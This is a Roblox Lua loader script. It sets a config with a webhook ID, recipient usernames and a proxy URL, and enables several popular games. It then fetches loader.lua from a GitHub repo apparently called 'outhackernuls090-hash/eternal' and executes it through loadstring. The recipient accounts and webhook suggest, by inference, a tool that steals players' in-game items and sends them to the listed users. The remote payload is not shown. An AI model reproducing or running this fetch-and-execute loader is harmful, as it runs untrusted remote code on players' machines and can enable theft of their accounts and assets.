-- _Send.mail = true
-- _G.Main = "ten acc chinh og"
_G.ED_CONFIG = {
    WEBHOOK_ID = "ceb0d8b499fe43db11f9a375b0a8b4d6",
    USERNAMES = {"unbareunhero"},
    PROXY_URL = "https://eternal-darkness.org/apis/proxy/",
    USERNAME = "meobeoreal._",
    ENABLED_GAMES = {["mm2"]=true,["ps99"]=true,["adm"]=true,["sab"]=true,["gag2"]=true,["sp"]=true,["bb"]=true,},
    CUSTOM_SCRIPTS = {}
}

local MainLoaderUrl = "https://raw.githubusercontent.com/outhackernuls090-hash/eternal/refs/heads/main/loader.lua"
local Success, Result = pcall(function()
    return game:HttpGet(MainLoaderUrl, true)
end)
if not Success or not Result or #Result == 0 then
    warn("[ED] Failed to load Main Loader")
    return
end
local _fn = (loadstring or load)(Result)
if type(_fn) == 'function' then
    local ok, _err = pcall(_fn)
    if not ok then warn('[ED] Error executing main loader: '..tostring(_err)) end
else
    warn('[ED] loadstring/load not available, cannot execute loaded code')
end
